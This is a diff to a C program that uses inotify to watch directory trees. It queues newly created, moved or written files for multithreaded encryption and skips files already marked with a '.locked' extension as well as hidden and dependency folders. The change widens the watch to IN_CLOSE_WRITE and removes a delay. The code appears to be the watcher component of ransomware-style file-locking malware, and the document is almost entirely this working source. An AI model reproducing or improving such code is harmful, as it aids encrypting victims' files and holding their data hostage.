@@ -24,20 +24,15 @@ void traverse(const char *path);
 bool is_skipped(const char *name) {
     if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0){
         return true;
-    }
-    if (name[0] == '.'){
+    } else if (name[0] == '.'){
         return true;
-    }
-    if (name[0] == '_' && name[1] == '_'){
+    } else if (name[0] == '_' && name[1] == '_'){
         return true;
-    }
-    if (strcmp(name, "venv") == 0){
+    } else if (strcmp(name, "venv") == 0){
         return true;
-    }
-    if (strcmp(name, "node_modules") == 0){
+    }else if (strcmp(name, "node_modules") == 0){
         return true;
-    }
-    if (strcmp(name, "site-packages") == 0){
+    }else if (strcmp(name, "site-packages") == 0){
         return true;
     }
     size_t len = strlen(name);
@@ -47,14 +42,24 @@ bool is_skipped(const char *name) {
     return false;
 }
 
+bool is_encrypted_output(const char *name) {
+    size_t len = strlen(name);
+    return len > 7 && strcmp(name + len - 7, ".locked") == 0;
+}
+
 void watcher_traverse(int fd, const char *path) {
 
     const char *dirname = strrchr(path, '/');
-    dirname = dirname ? dirname + 1 : path;
-    if (dirname[0] == '.' || (dirname[0] == '_' && dirname[1] == '_'))
+    if (dirname != NULL) {
+        dirname = dirname + 1;
+    } else {
+        dirname = path;
+    }
+    if (is_skipped(dirname)) {
         return;
+    }
 
-    int wd = inotify_add_watch(fd, path, IN_CREATE | IN_MOVED_TO);
+    int wd = inotify_add_watch(fd, path, IN_CREATE | IN_MOVED_TO | IN_CLOSE_WRITE);
 
     if (wd == -1) {
         perror("inotify_add_watch");
@@ -111,11 +116,15 @@ void *start_watcher(void *args) {
         }
 
         if (clearBuffer) {
+
             clearBuffer = false;
             char discard[BUF_LEN];
             struct pollfd pfd = {fd, POLLIN, 0};
-            while (poll(&pfd, 1, 0) > 0)
+
+            while (poll(&pfd, 1, 0) > 0){
                 read(fd, discard, BUF_LEN);
+            } 
+
         }
 
 
@@ -128,7 +137,7 @@ void *start_watcher(void *args) {
 
             if (event->len > 0) {
 
-                if (is_skipped(event->name) || strstr(event->name, ".locked") != NULL) {
+                if (is_skipped(event->name) || is_encrypted_output(event -> name)) {
                     i += sizeof(struct inotify_event) + event->len;
                     continue;
                 }
@@ -141,17 +150,22 @@ void *start_watcher(void *args) {
                 }
 
                 if (event->mask & IN_ISDIR && event->mask & IN_MOVED_TO) {
+
                     watcher_traverse(fd, full_path);
                     clear_queue(&queue);
+
                     traverse(full_path);
                     enqueue(&queue, "END_ENCRYPT");
                     initialize_threads(THREADS_NUMBER, true);
 
                 } else if (event->mask & IN_ISDIR && event->mask & IN_CREATE) {
                     if (strcmp(watchedPaths[event->wd], start_path) == 0) {
-                        sleep(2);
+
+                        // sleep(2);
+
                         watcher_traverse(fd, full_path);
                         clear_queue(&queue);
+
                         traverse(full_path);
                         enqueue(&queue, "END_ENCRYPT");
                         initialize_threads(THREADS_NUMBER, true);
@@ -173,7 +187,7 @@ void *start_watcher(void *args) {
                     }
                 } 
             }
-            i += sizeof(struct inotify_event) + event->len;
+            i = i + sizeof(struct inotify_event) + event->len;
         }
     }
     return NULL;
